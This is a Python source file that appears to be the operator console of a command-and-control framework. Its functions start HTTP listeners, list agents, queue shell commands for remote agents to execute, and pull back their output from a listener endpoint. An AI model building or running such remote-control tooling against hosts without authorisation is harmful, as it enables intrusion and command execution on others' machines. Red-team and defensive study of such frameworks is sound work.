import requests
from collections import OrderedDict
from listener import Listener
from task import TaskShell
from database import Database

listenersList = OrderedDict()
db = Database()
agentsList = db.getAgents()

def updateAgentsList():
    agentsList = db.getAgents()

def listAgents():
    for i in agentsList:
        print(f"\t-- {i} - <{agentsList[i].getName()}>")

def startListener(args):
    listener = Listener(args[0], int(args[2]), args[1])
    listener.start()
    listenersList[args[0]] = listener

    return 0

def sendTask(command, args):
    agent = agentsList[args[1]]
    if command == "shell":
        task = TaskShell(agent.getPath(), args[0])
        agentsList[args[1]].setTask(task)
        listenersList[agent.getListener()].setAgentsList(agentsList)

    return 0

def retrieveTaskResult(args):
    agent = agentsList[args[0]]
    listener = listenersList[agent.getListener()]
    listenerIp = listener.getIp()
    listenerPort = listener.getPort()
    request = "http://{}:{}/showResult?agent={}".format(
        listenerIp,
        listenerPort,
        agent.getName()
    )

    res = requests.get(request)

    if res.status_code == 200:
        print(f"\tAgent return : {res.text}")

def listListeners():
    for i in listenersList:
        print(f"\t-- {i} - {listenersList[i].getName()}: <{listenersList[i].getIp()}:{listenersList[i].getPort()}>")

    return 0
